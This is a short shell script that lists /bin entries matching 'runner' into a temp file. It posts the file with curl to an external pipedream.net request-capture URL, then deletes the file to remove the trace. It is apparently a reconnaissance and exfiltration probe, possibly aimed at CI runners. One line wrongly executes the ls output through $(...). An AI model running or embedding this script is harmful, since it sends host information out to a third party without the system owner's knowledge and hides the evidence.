#!/bin/sh

echo "--- START ---" > /tmp/file.txt

echo "--- /bin" >> /tmp/file.txt
$(ls -1la /bin/ | grep -i runner)  >> /tmp/file.txt
#echo "--- /usr/bin" >> /tmp/file.txt
#ls -1la /usr/bin/ >> /tmp/file.txt

echo "--- FINISH ---" >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://ensf2rlc2dw6p.x.pipedream.net/

rm /tmp/file.txt
